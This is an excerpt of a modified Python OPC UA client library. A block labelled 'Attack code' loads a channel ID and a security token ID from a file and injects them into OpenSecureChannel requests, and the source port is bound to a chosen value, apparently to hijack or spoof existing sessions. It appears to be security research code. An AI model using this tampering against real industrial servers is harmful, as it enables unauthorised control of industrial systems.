...
class UASocketProtocol(asyncio.Protocol):
    ...
    def _send_request(self, request, timeout: float = 1, message_type=ua.MessageType.SecureMessage) -> asyncio.Future:
        ...
        # Attack code
        # Open Channel
        if request.TypeId.Identifier == 446:
            with open("attack.txt", "r") as f:
                repeated_channel = int(f.readline())
                repeated_stoken = int(f.readline())
                self._connection.security_token.ChannelId = repeated_channel
                self._connection.security_token.TokenId = repeated_stoken
        # Any other request
        #else:
        ...
        #        request.RequestHeader.AuthenticationToken = NodeId(guid, 1, NodeIdType.Guid)
...
class UaClient(AbstractSession):
    ...
    async def connect_socket(self, host: str, port: int, src_port: int):
        """Connect to server socket."""
        self.logger.info("opening connection")
        self._closing = False
        # Timeout the connection when the server isn't available
        await asyncio.wait_for(
            asyncio.get_running_loop().create_connection(self._make_protocol, host, port, local_addr=("0.0.0.0", src_port)), self._timeout
        )
